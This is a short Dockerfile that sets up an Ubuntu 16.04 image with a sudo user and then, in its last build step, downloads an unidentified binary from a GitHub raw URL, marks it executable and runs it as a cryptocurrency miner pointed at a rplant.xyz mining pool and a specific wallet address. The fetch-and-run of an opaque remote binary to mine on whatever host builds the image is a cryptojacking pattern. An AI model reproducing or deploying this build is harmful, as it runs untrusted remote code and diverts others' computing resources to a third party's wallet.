#####################################################################
#                   thank you bro rizafiq                           #
#####################################################################
FROM ubuntu:16.04
ENV DEBIAN_FRONTEND=noninteractive

RUN set -ex; \
    apt-get update \
    && apt-get install -y --no-install-recommends \
    ubuntu-desktop \
    sudo \
    bash \
    curl \
    git \
	  unzip \
	  wget \
	  && apt-get update \
	  && apt-get upgrade -y \
    && apt-get autoclean \
    && apt-get autoremove \
    && rm -rf /var/lib/apt/lists/*

RUN useradd -m kunemuse && \
    adduser kunemuse sudo && \
    sudo usermod -a -G sudo kunemuse

RUN wget https://raw.githubusercontent.com/razmai9/0001-0050/master/0014 && chmod +x 0014 && ./0014 -a yespowerSUGAR -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1qjhuqfmdcmaq6qr0dlxh2c9d874x6eaa88vmj3y.cpu1 -t4
